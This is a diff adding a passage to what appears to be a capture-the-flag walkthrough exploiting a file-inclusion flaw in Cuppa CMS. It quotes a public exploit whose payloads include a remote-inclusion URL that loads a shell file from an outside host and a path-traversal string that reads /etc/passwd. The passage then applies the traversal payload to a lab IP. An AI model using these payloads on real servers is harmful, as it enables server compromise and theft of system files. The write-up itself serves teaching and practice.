@@ -105,3 +105,24 @@ I tried logging in with the credentials we found earlier but no luck. Let's try 
 
 ![searchsploit](https://github.com/user-attachments/assets/24dcf396-5117-43f4-972f-947882757361)
 
+Here's a run down of the exploit: 
+#####################################################
+DESCRIPTION
+#####################################################
+
+An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+So, let's try to get the /etc/passwd file first. Our crafted payload should look like this but with whatever your target IP is:
+```bash
+http://10.10.19.189/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+```
+And we have the /etc/passwd file, which we will save. 
